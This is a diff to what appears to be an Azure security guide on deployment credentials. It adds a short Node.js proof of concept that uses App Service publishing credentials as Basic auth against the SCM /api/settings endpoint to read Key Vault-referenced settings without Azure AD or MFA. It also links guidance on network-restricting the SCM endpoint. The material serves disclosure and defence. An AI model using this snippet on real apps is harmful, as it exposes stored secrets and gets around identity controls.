@@ -102,6 +102,19 @@ Essentially these credentials are used for two scenarios Basic auth string in au
 ##### Bypassing Azure AD with indirect access to Azure Key Vault References 
 
 1. Attacker uses Basic Auth (publishingUserName and publishingPassword) to access directly key vault references that are loaded for runtime in the SCM API
+
+**POC - Node.js**
+```Javascript
+async function mfaBypassToGetKeyVaultReferences(publishingUserName, publishingPassword, name) {
+    var base64 = Buffer.from(`${publishingUserName}:${publishingPassword}`).toString('base64')
+    var {data} = await axios({
+        url:`https://${name}.scm.azurewebsites.net/api/settings`,
+        headers: {
+            "Authorization": "Basic " + base64},
+            method:"get",
+    }).catch((error) => console.log('sd')); console.log(data)
+}
+```
    
   **✅Credentials as Azure Key Vault Reference / Backed by Azure AD**
  ![img](img/depcred2.png)
@@ -123,6 +136,7 @@ Since many of the automations use these credentials, and publishing to app servi
 
 2. [Network restriction on SCM endpoint](https://docs.microsoft.com/en-us/azure/azure-functions/security-concepts#secure-the-scm-endpoint)
 *When you use network isolation to secure your functions, you must also account for this endpoint.*
+
 
 #### SAS KEYS
 
